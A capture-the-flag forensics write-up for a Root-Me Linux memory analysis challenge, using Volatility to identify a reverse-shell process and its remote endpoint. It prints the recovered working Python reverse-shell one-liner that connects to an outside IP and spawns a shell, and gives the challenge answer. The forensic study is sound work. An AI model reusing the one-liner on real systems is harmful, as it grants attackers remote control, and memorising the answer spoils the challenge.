# RAM Analysis - Linux - Network (Root-Me Pro, Forensic, 200pts)

## Step 1: Identify attacker IP:port

### Files
- memory.zip (178M) → memory/memory.vmem (2.0G), memory.vmsn, linux.json (51M pre-built ISF symbols)
- Kernel: vmlinux-6.12.63+deb13-amd64 (Debian 13)
- linux.json shipped in the zip → point vol at it with `-s files/memory`

### Commands
```
vol -q -s files/memory -f files/memory/memory.vmem linux.sockstat | grep AF_INET
vol -q -s files/memory -f files/memory/memory.vmem linux.psaux
```

### Finding
python3 PID 1859 — FDs 0,1,2,3 ALL point to the same TCP socket = reverse shell signature.
```
192.168.254.152:43132  ->  163.172.71.54:9740   ESTABLISHED
```
cmdline:
```
python3 -c import os,pty,socket;s=socket.socket();s.connect(("163.172.71.54",9740));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

Process tree:
- sshd 913 (LISTEN :22)
- sshd-session 1153/1175 (martin, from 192.168.254.1)
- bash 1176
- python3 1859 (reverse shell) -> sh 1860

### ANSWER (Step 1)
```
163.172.71.54:9740
```
